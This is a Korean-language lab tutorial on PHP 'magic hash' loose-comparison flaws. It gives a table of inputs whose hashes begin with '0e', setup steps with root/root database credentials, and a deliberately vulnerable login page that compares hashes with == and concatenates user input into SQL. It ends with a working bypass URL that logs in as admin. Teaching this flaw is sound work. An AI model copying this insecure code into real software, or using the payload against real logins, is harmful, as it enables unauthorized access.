# Magic Hash

"0e123" == "0e456"과 같이 0e로 시작하고 0-9로 이루어진 문자열끼리 연산이 이루어질 때, 0\*10^123과 0\*10^456의 비교로 이루어져 의도하지 않게 프로그램이 진행될 수 있다.

# **INDEX**

**1. [Magic Hash Table](#Magic-Hash-Table)**

**2. [환경 구성](#환경-구성)**

**3. [로그인 인증 우회](#로그인-인증-우회)**

# **Magic Hash Table**

|Hash Type|Hash Length|"Magic" Number / String|Magic Hashes|
|:---:|:---:|:---:|:---:|
|md2|32|505144726|0e015339760548602306096794382326|
|md4|32|48291204|0e266546927425668450445617970135|
|md5|32|240610708|0e462097431906509019562988736854|
|sha1|40|10932435112|0e07766915004133176347055865026311692244|
|sha224|56|–|–|
|sha256|64|–|–|
|sha384|96|–|–|
|sha512|128|–|–|
|ripemd128|32|315655854|0e251331818775808475952406672980|
|ripemd160|40|20583002034|00e1839085851394356611454660337505469745|
|ripemd256|64|–|–|
|ripemd320|80|–|–|
|whirlpool|128|–|–|
|tiger128,3|32|265022640|0e908730200858058999593322639865|
|tiger160,3|40|13181623570|00e4706040169225543861400227305532507173|
|tiger192,3|48|–|–|
|tiger128,4|32|479763000|00e05651056780370631793326323796|
|tiger160,4|40|62241955574|0e69173478833895223726165786906905141502|
|tiger192,4|48|–|–|
|snefru|64|–|–|
|snefru256|64|–|–|
|gost|64|–|–|
|adler32|8|FR|00e00099|
|crc32|8|2332|0e684322|
|crc32b|8|6586|0e817678|
|fnv132|8|2186|0e591528|
|fnv164|16|8338000|0e73845709713699|
|joaat|8|8409|0e074025|
|haval128,3|32|809793630|00e38549671092424173928143648452|
|haval160,3|40|18159983163|0e01697014920826425936632356870426876167|
|haval192,3|48|48892056947|0e4868841162506296635201967091461310754872302741|
|haval224,3|56|–|–|
|haval256,3|64|–|–|
|haval128,4|32|71437579|0e316321729023182394301371028665|
|haval160,4|40|12368878794|0e34042599806027333661050958199580964722|
|haval192,4|48|–|–|
|haval224,4|56|–|–|
|haval256,4|64|–|–|
|haval128,5|32|115528287|0e495317064156922585933029613272|
|haval160,5|40|33902688231|00e2521569708250889666329543741175098562|
|haval192,5|48|52888640556|0e9108479697641294204710754930487725109982883677|

# **환경 구성**

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.0.58              |
| apache2       | 2.4.41-4ubuntu3.10        |
| php           | 7.4.3                     |
| mariadb       | 10.3.34-0ubuntu0.20.04.1  |

apache, php와 데이터베이스를 사용하기 위해 관련 패키지를 설치하자.

```sh
root@ubuntu:~# apt -y install apache2 php mariadb-server php-mysql
```

root비밀번호를 설정하고 데이터베이스, 테이블을 생성한 뒤 데이터를 넣자.

```sh
root@ubuntu:~# mysql_secure_installation
Enter current password for root (enter for none):
Set root password? [Y/n] Y
New password:
Re-enter new password:
Remove anonymous users? [Y/n] Y
Disallow root login remotely? [Y/n] n
Remove test database and access to it? [Y/n] Y
Reload privilege tables now? [Y/n] Y
root@ubuntu:~# mysql -u root -p'root'
MariaDB [(none)]> create database test;
MariaDB [(none)]> use test;
MariaDB [test]> create table user (id varchar(30), pw varchar(255));
MariaDB [test]> insert into user(id,pw) values('admin',MD5('QLTHNDT'));
```

생성한 데이터베이스로 접근할 수 있는 권한을 부여하자.

```sh
MariaDB [(none)]> grant all privileges on test.* to 'root'@localhost identified by 'root';
MariaDB [(none)]> flush privileges;
```

이후 php.ini를 수정하여 데이터베이스 관련 함수를 사용할 수 있도록 하자.

```ini
extension=mysqli.so
```

Magic Hash를 사용한 인증에 취약한 페이지를 생성하자.

```php
<?php
	if (isset($_GET['userid']) && isset($_GET['password'])) {
		$conn = mysqli_connect("localhost", "root", "root", "test");
		if (!$conn) die("mysql connect error : ".mysqli_connect_error($conn));
        $sql = "SELECT id, pw FROM user WHERE id='".$_GET['userid']."'";
		$result = mysqli_query($conn, $sql);
		$row = mysqli_fetch_array($result);
		if ($row['pw'] == md5($_GET['password'])) echo "Welcome ".$row['id'];
		else echo "Login Failed";
		mysqli_close($conn);
	} else {
?>
<html>
	<body>
		<form action="/index.php" method="get">
			<label>ID : </label><input type="text" name="userid" required>
			<label>PW : </label><input type="password" name="password" required>
			<input type="submit" value="login">
		</form>
	</body>
</html>
<?php
	}
?>
```

# **로그인 인증 우회**

password에 240610708을 넣어 md5함수에 의해 0e462097431906509019562988736854값이 나오고, admin의 password는 0e405967825401955372549139051580값이다.

둘의 값은 0으로 같다고 판단되어 if문으로 들어가게 된다.

| data	| value	|
| :---	| :--- 	|
| ID	| admin |
| PW	| 240610708 |
| URL	| http://192.168.0.58/index.php?userid=admin&password=240610708 |

결과는 다음과 같다.

	Welcome admin